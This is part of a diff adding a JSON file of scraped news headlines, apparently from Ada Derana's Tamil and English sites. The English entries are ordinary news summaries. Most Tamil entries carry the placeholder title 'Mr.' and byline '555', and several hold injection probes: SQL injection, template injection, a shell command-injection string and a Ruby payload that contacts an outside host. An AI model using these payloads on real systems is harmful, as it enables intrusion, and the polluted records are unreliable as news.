+        "href": "news.php?nid=200704",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200704",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "e51cbc36e18a5a5b4381a3bb5e7331f7e81b9336dd9d831731c7e76ebf4eebfe"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200457",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:14 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200457",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "aff414a9ce74258a5337e84bf4305688a809b07c5fa99f6dfc4a4ff4ad40fc27"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201481",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201481",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "d82756235034deae84e27993f16ba8779c52c60c1067583344656ba6c1a5b288"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202502",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202502",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "138f8c6c7a6591a334ae6a970d4ce783f207da1851f10b4070f434d5edbff469"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200199",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200199",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "8cdab5d05767140c72788067b999c578cd3ececc14ae652c7cc526c695104eb0"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200713",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200713",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "e1edaeb626957a83f91dc2c6d29de64e59fc22573331e94a58ac22ebd1c09041"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200967",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200967",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "a64db2b3e2b92a095a9d5ef7ede21a993aa441dfc567358d6b8f578e39dcded8"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201479",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201479",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "b0d7c0ec662c9aac47054641b58f2e43a916f446eb0707366abafc658239312e"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200456",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:14 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200456",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "8296da2fea81a35c436af7d2cabb45e36cd135f7314e7a619268c67174fae1fd"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200712",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200712",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "ed735243ae852f92103cbf511ed49106fb086df44f40aaec0d85e84b5d4c0926"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200965",
+        "byline": "'}dfb{98991*97996}xca",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200965",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "6d00ee17a628147e70c619d5058caa082df09a7e100d68f3085530fdc72e97a0"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201224",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201224",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "14e8679d0e5a2824c0a55bf2955d86d7a35ead94c546b8cf867e9a4201816f38"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201225",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201225",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "11d53f2bea883fe15214ee229f074c7f50f77a615f1c9c8c8007239ae501593c"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201986",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201986",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "af9f7af5a0e613035c2c3a2fe37d0dda7af187ca217cb9852da41a30a0ca36cc"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200449",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:13 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200449",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "3eaa6919ae7db66bc00c59bd105270017b4650bb1e833547017232dc559a8ee6"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200198",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200198",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "499d9dba5565c8abed154b8653911899f60097b1b250abbc95de1f7fdb0c900b"
+      },
+      {
+        "title": "Mr.|echo texeqr$()\\ wcyjvq\\nz^xyu||a #' |echo texeqr$()\\ wcyjvq\\nz^xyu||a #|\" |echo texeqr$()\\ wcyjvq\\nz^xyu||a #",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201732",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201732",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "d588e18a46c7ca8cff79eaae5823df2cb46f4e45a16727e199fe58a79511a1f2"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201734",
+        "byline": "dfb{{'abcd'.toUpperCase()}}xca",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201734",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "9b0a0a1e6164130d2c142060313dfc404b5b17ce83cb6f908c4b0907b6458a36"
+      },
+      {
+        "title": "-1' OR 5*5=25 or 'zICygsJo'='",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201985",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201985",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "7e9e75af8b0144541d1835b413b9e1f2ba4dcfab06f4ae03253f8e79e446d5b1"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200964",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200964",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "75d64e6386a905834773d8bdf8c49191cab27ad7b1943316c851b7ef4bcf11eb"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201992",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201992",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "0d8953a2d5529b2c809b4fe095c7c83cad183b4f453750bfc368e58b645be875"
+      },
+      {
+        "title": "-1' OR 5*5=26 or 'zICygsJo'='",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201991",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201991",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "280d179fedbf71bea062dbfb061b451f53996243dd5f744886d5c3bf9dd17628"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200200",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200200",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "876aee4726226a6ad05904f45add9651eb7f8299bab9f26b1f3882178db31fbd"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200452",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:14 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200452",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "84f1f67e5da46b102b0cff1facb0bea5bd67bb8293ba328670ed2d60a56c4eea"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200197",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200197",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "f042380e77ac6a31841072f6e98e4578f6eff9c60b6facb2a5e1d6fffe6e3c1c"
+      },
+      {
+        "title": "'A'.concat(70-3).concat(22*4).concat(101).concat(85).concat(113).concat(68)+(require'socket'\nSocket.gethostbyname('hitid'+'juszyyls3cba8.bxss.me.')[3].to_s)",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201220",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201220",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "fd5ace285343747102340e92f871a2970f0e998219f9784634ce4162ae4842f4"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201216",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201216",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "d08514e5816cf9ee9ea15ed85991636bfb6da61f4c0ba0e1febaeeca1c55d00d"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201988",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201988",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "155bef1f7253344cdbee9022327036a7c8741d7f891f6afd9e1967fa1012135f"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202501",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202501",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "be8d996345086b30387dbdd4a73d21f6057134036bf2e5f58bbc5383b403ad58"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=201736",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=201736",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "cc57a733898afec6ed1775379c4d35a6d17bd0b1635453c22b6650e0deef77d8"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202245",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202245",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "de19fb6e826a8eee9220f483955339eab1876cc9543d2ee62f6fd02f1341af23"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200960",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200960",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "06ea23437ebe4eaf1628ec71956e5318b0e6b30739095384e33d7bc2dcb6ddd4"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200192",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200192",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "c50575a2fc4e24508d0a405e10c030d27cd1b49f9d75915d43cb2b0f2c9d0e2f"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200966",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200966",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "7e0f438d373268e1d9d96fb54427d20d21fc4a720038cecd13cd3d717223d3a0"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200194",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200194",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "7e507e62de34963f07c162fb923aafc2e7e7fe9080a6b2227505c958225d0cc0"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200707",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200707",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "7c1164057e4881f21f4916df15d05fba59b82822ef063c0a92768aada029290b"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202497",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202497",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "ae630e9716fe7aa7a4fabac1bcfa2f9290cacc4159f01b2a4b6863dc44098511"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201474",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201474",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "a843a08ec19f5afca35c9ee858eebd416874d21794b14ba9c43e8e05e651165c"
+      }
+    ]
+  },
+  "adaderana": {
+    "success": true,
+    "data": [
+      {
+        "title": "India faces first legal challenge against online money games ban",
+        "href": "https://www.adaderana.lk/news.php?nid=111946",
+        "byline": "An Indian gaming company has challenged the government’s ban on online money-based games, a legal filing shows, in the first case against a law that led to the sudden shutdown of popular contests and has thrown the industry’s future into doubt.",
+        "timestamp": "August 28, 2025  3:19 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111946",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "67789e4b246dd7ea703bbcbae8ccfd9695bcd974c5ac9327b66d9608f10713c1"
+      },
+      {
+        "title": "CEB Engineers’ Union opposes letters issued to employees without VRS offer",
+        "href": "https://www.adaderana.lk/news.php?nid=111959",
+        "byline": "The Ceylon Electricity Board Engineers’ Union has raised concerned about the purported assignation letters issued to employees of the CEB claiming to be under and in terms of the Sri Lanka Electricity Act.",
+        "timestamp": "August 28, 2025  7:38 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111959",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "b2ee908d3aaa6eded3afba7212717565fc73a735df1df6f409721d0453a94e06"
+      },
+      {
+        "title": "Schoolgirl and lorry assistant killed in road accident in Kahatagasdigiliya",
+        "href": "https://www.adaderana.lk/news.php?nid=111958",
+        "byline": "A schoolgirl and a lorry assistant have died in a road accident that occurred this afternoon in Alayapattuwa along the Horowpothana –Kahatagasdigiliya main road.",
+        "timestamp": "August 28, 2025  6:53 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111958",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "2c28887382f7f62088d4736b0c870d94c2569680dffaaf879769deb102b09734"
+      },
+      {
+        "title": "Japan’s trade negotiator cancels US visit over tariff deal snag",
+        "href": "https://www.adaderana.lk/news.php?nid=111963",
+        "byline": "Japan’s top trade negotiator cancelled a visit to the United States at the last minute on Thursday, further delaying talks designed to finalise a $550 billion investment package offered by Tokyo in exchange for relief on punishing tariffs.",
+        "timestamp": "August 28, 2025  10:28 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111963",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "388bbcb949b5e7508afa23f77ff32cc7ff458125382e63079b5b5ef895376f6f"
+      },
+      {
+        "title": "New details emerge on arrest of five underworld figures including  Kehelbaddara Padme’ in Indonesia",
+        "href": "https://www.adaderana.lk/news.php?nid=111962",
+        "byline": "New details have emerged regarding the arrest of five high-profile underworld figures, including Kehelbaddara Padme, who are linked to multiple murders—including the killing of Ganemulla Sanjeewa—and major drug trafficking operations.",
+        "timestamp": "August 28, 2025  10:10 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111962",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "2f7067a1427dc2789ef08d329a033893b76f11b62c121ee0bf723ad15af14b40"
+      },
+      {
+        "title": "UK, France and Germany move to reimpose UN sanctions on Iran",
+        "href": "https://www.adaderana.lk/news.php?nid=111960",
+        "byline": "The UK, France and Germany have begun the process of restoring major UN sanctions on Iran - lifted under a 2015 deal - as tensions once again escalate over Iran’s nuclear programme.",
+        "timestamp": "August 28, 2025  8:26 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111960",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "6eabe3062c212cd2b77f5642b495035242f16b43e54653a98ea75e0cb810ac8e"
+      },
+      {
+        "title": "Man arrested for assaulting police officer during protest near Fort Magistrate’s Court remanded",
+        "href": "https://www.adaderana.lk/news.php?nid=111952",
+        "byline": "An individual, who was arrested for allegedly assaulting a police officer on duty with a water bottle adjacent to the Colombo Fort Magistrate’s Court on Tuesday, has been remanded, said Ada Derana reporter.",
+        "timestamp": "August 28, 2025  4:44 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111952",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "ddd7dd63cbd880f81f67b14bbcf03a16ff62d1070784d3b518f8c1d05f8fcf8b"
+      },
+      {
+        "title": "‘National Research Priorities Report’ handed over to President’s Secretary",
+        "href": "https://www.adaderana.lk/news.php?nid=111949",
+        "byline": "The Research Priorities for Sri Lanka – 2026 report, aligned with the Government’s socio-economic development programme, has been officially presented to the Secretary to the President Dr Nandika Sanath Kumanayake at the Presidential Secretariat today.",
+        "timestamp": "August 28, 2025  3:54 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111949",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "ae6e735d7b12380816b2f8e2f7b75a0c69146dc9e04a9f02d74d17eea962543a"
+      },
+      {
+        "title": "SLTB trade unions launch strike over several demands",
+        "href": "https://www.adaderana.lk/news.php?nid=111928",
+        "byline": "Several trade unions of the Sri Lanka Transport Board (SLTB) commenced trade union action from midnight yesterday (27) based on four demands.",
+        "timestamp": "August 28, 2025  8:06 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111928",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "4050be2afcbc47a1b4ba56905638c02b5be8885da9d0da31727c113230a0d2de"
+      },
+      {
+        "title": "More details revealed on shooting incident in Panadura",
+        "href": "https://www.adaderana.lk/news.php?nid=111929",
+        "byline": "Sri Lanka Police have revealed more information regarding the shooting incident in the Alubogahawatte area in Wanduramulla, Panadura, that killed one person last night.",
+        "timestamp": "August 28, 2025  8:52 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111929",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "b8793102a57e747293b68efe938a1f2ad7bab18a7a0b89e924ca41e7d2452a6a"
+      },
+      {
+        "title": "Govt. will extend its support to strengthen manufacturing industry, says President Dissanayake",
+        "href": "https://www.adaderana.lk/news.php?nid=111933",
+        "byline": "A pre-budget discussion for the year 2026 was held on Wednesday (27) at the Presidential Secretariat under the patronage of President Anura Kumara Dissanayake with local entrepreneurs in the ceramic industry, to review concerns and proposals related to challenges in the industry.",
+        "timestamp": "August 28, 2025  10:22 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111933",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "9844c9c449da644f909200c5b0947baaa9306bafaa3be94526cecba436f1d0c0"
+      },
+      {
+        "title": "Former NLB Director Thusitha Halloluwa further remanded",
+        "href": "https://www.adaderana.lk/news.php?nid=111940",
+        "byline": "Former Executive Director of the National Lotteries Board, Thusitha Halloluwa, has been further remanded until September 4 by the Colombo Magistrate’s Court, said Ada Derana reporter.",
+        "timestamp": "August 28, 2025  1:39 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111940",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "ba29cfe08dc2579269e98273883c2eba684b1d2be4b14d76e3445b7502f63e64"
+      },
+      {
+        "title": "Teacher recruitment exam once SC concludes hearing of four cases: PM",
+        "href": "https://www.adaderana.lk/news.php?nid=111951",
+        "byline": "The legal proceedings of four cases under review by the Supreme Court, which have been the primary reason for the delay in recruiting unemployed graduates as teachers are now reaching their final stage, according to Prime Minister Dr Harini Amarasuriya.",
+        "timestamp": "August 28, 2025  4:20 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111951",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "e003e950e52d608e56e5f05752a8ea06e62a6e1eb3966bd9f0c77d5885c5c626"
+      },
+      {
+        "title": "Historic operation in Indonesia led to arrest of 5 major Sri Lankan underworld figures at once - IGP",
+        "href": "https://www.adaderana.lk/news.php?nid=111938",
+        "byline": "The arrest of five of Sri Lanka’s most infamous underworld figures in Indonesia at once marks the first time in history that such an operation has been carried out, says Inspector General of Police (IGP) Priyantha Weerasooriya.",
+        "timestamp": "August 28, 2025  12:39 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111938",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "2c22478e58bae594c0daa1cd829f987a3479e874bcccaa3da802c8ff6dda3170"
+      },
+      {
+        "title": "Second round of review of new Anti-Terrorism Bill underway",
+        "href": "https://www.adaderana.lk/news.php?nid=111947",
+        "byline": "President’s Counsel Rienzie Arsekularatne, the Chairman of the expert committee appointed under Cabinet approval to draft the new Anti-Terrorism Bill stated that the committee’s work will be completed within the month of September.",
+        "timestamp": "August 28, 2025  3:24 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111947",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "cefae4a0bbbc8cfdc64e2e6e4c03ee7287ccf8d840e012d84a38ff946d2f167f"
+      },
+      {
+        "title": "Showers expected in parts of the island",
+        "href": "https://www.adaderana.lk/news.php?nid=111925",
+        "byline": "Showers will occur at times in the Western, Sabaragamuwa and Central provinces and in Galle and Matara districts, the Department of Meteorology said.",
+        "timestamp": "August 28, 2025  6:15 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111925",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "c1bad8ebbc24221fc47378acf715e9be6f6b47aa68f700e074b6f9cfe8fcb555"
+      },
+      {
+        "title": "Nvidia CEO says AI boom far from over",
+        "href": "https://www.adaderana.lk/news.php?nid=111935",
+        "byline": "Nvidia CEO Jensen Huang on Wednesday dismissed concern about an end to a spending boom on artificial intelligence chips, projecting opportunities will expand into a multi-trillion-dollar market over the next five years.",
+        "timestamp": "August 28, 2025  10:33 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111935",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "f728b7d99eac96987e3e9d3893cf70c2120adbf91b2f4faf7cb19edfcd16302d"
+      },
+      {
+        "title": "One person killed in shooting in Panadura",
+        "href": "https://www.adaderana.lk/news.php?nid=111924",
+        "byline": "A person has been killed in a shooting incident in the Alubogahawatte area in Wanduramulla, Panadura.",
+        "timestamp": "August 28, 2025  12:14 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111924",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "0fe25ca49530f11767495a994cf75a412856ff3a1259abdece1fad944d9638e6"
+      },
+      {
+        "title": "Man held at BIA with mobile phones and cardamom worth Rs. 20M",
+        "href": "https://www.adaderana.lk/news.php?nid=111955",
+        "byline": "An individual has been arrested at the Bandaranaike International Airport while attempting to smuggle a consignment of mobile phones and cardamom worth approximately Rs. 20 million into the country.",
+        "timestamp": "August 28, 2025  5:25 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111955",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "a9bf1ced80ca08b7fda4de0a98015609fee845341723437310be7f43642f7bf2"
+      },
+      {
+        "title": "646 individuals arrested during special island-wide police raids",
+        "href": "https://www.adaderana.lk/news.php?nid=111957",
+        "byline": "A total of 646 individuals have been arrested on suspicion of being involved in criminal activities and also over illicit liquor and drug-related offenses during a special island-wide operation conducted yesterday.",
+        "timestamp": "August 28, 2025  6:33 pm",
